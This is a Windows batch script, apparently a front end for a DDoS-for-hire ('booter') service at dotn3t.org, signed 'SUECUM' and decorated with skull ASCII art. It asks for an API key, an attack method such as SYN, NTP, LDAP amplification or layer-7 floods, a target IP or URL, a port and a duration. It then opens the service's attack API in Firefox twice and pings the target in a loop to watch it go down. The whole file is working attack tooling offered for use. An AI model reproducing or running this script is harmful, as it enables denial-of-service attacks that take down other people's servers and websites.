@echo off
title [L-4-7 ENFORCER FOR DOTN3T.ORG]
color 0A
::: 
:::                         ____________
:::                       .~      ,   . ~.
:::                      /                \
:::                     /      /~\/~\   ,  \
:::                    |   .   \    /   '   |
:::                    |         \/         |
:::           XX       |  /~~\        /~~\  |       XX
:::         XX  X      | |  o  \    /  o  | |      X  XX
:::       XX     X     |  \____/    \____/  |     X     XX
:::  XXXXX     XX      \         /\        ,/      XX     XXXXX
::: X        XX%;;@      \      /  \     ,/      @%%;XX        X
::: X       X  @%%;;@     |           '  |     @%%;;@  X       X
::: X      X     @%%;;@   |. ` ; ; ; ;  ,|   @%%;;@     X      X
:::  X    X        @%%;;@ IIIIIIIIIIIIIIII @%%;;@        X    X
:::   X   X          @%%;;@              @%%;;@          X   X
:::    X  X            @%%;;@          @%%;;@            X  X
:::     XX X             @%%;;@      @%%;;@             X XX
:::       XXX              @%%;;@  @%%;;@              XXX
:::                          @%%;;%%;;@
:::                            @%%;;@
:::                          @%%;;@..@@
:::                           @@@  @@@
:::
:::                 [WELCOME TO L-4-7 ENFORCER]
:::                         [BY SUECUM]
:::
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
set/p "apikey=-----------------[YOUR API KEY] "
color 4
echo -----------------[METHODS]
echo -----------------[L4 LDAP NTP ACK SYN TCP-MIX GAME]
echo -----------------[L7 COLLAPSE RAND PPS COOKIE]
echo -----------------[L7 BURST NETBYPASS SOCKET TOR] 
set/p "method=-----------------[METHOD] "
if %method%== TOR goto :L7
if %method%== SOCKET goto :L7
if %method%== RAND goto :L7
if %method%== COLLAPSE goto :L7
if %method%== BURST goto :L7
if %method%== NETBYPASS goto :L7
if %method%== PPS goto :L7
if %method%== COOKIE goto :L7
set/p "target=-----------------[IP] "
set/p "port=-----------------[PORT] "
set/p "time=-----------------[TIME] "
start firefox.exe "https://dotn3t.org/system/index.php?page=Api&key=%apikey%&host=%target%&port=%port%&time=%time%&method=%method%"
start firefox.exe "https://dotn3t.org/system/index.php?page=Api&key=%apikey%&host=%target%&port=%port%&time=%time%&method=%method%"
:L4PING
echo -----------------[L4 %method% ATTACK SENT TO %target% FOR %time% SECONDS]
echo -----------------[TRACKING %target% STATUS]
ping -t %target%
goto :L4PING
:L7
set/p "target=-----------------[URL] "
set/p "time=-----------------[TIME] "
start firefox.exe "https://dotn3t.org/system/index.php?page=Api&key=%apikey%&host=%target%&port=80&time=%time%&method=%method%"
start firefox.exe "https://dotn3t.org/system/index.php?page=Api&key=%apikey%&host=%target%&port=80&time=%time%&method=%method%"
:L7STARTED
echo -----------------[L7 %method% ATTACK SENT TO %target% FOR %time% SECONDS]
goto :L7STARTED
